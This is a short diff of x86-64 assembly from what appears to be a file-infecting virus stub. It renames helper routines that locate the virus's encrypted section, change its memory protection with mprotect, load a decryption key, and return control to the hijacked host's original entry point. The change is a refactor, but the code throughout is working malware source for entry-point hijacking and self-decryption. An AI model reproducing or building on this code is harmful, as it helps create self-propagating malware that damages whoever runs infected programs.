@@ -55,16 +55,16 @@ _ret2oep:
     add rax, 0x77777777 ; old entry_point
     ret
 
-_ret2encryptedsection:
+_getencryptedsectionaddr:
     call _get_rip
     sub rax, 0x66666666 ; virus size without ret2oep
     sub rax, 0x66666666 ; new_entry_point
-    add rax, 0x66666666 ; start of text section
+    add rax, 0x66666666 ; start of encrypted section
     ret
 
 _mprotect:
-    call _ret2encryptedsection
-    call _retencryptedsectionsize
+    call _getencryptedsectionaddr
+    call _getencryptedsectionsize
     mov rdi,  rax
     and rdi, -0x1000
     mov rax, 0xa
@@ -73,13 +73,13 @@ _mprotect:
     syscall
     ret
 
-_retencryptedsectionsize:
+_getencryptedsectionsize:
     mov r14, 0x55555555
     ret
 
 _getvar:
-    call _ret2encryptedsection
-    call _retencryptedsectionsize
+    call _getencryptedsectionaddr
+    call _getencryptedsectionsize
     mov rdi, rax
     mov rsi, r14
     mov rcx, [rel $+key_len-$]
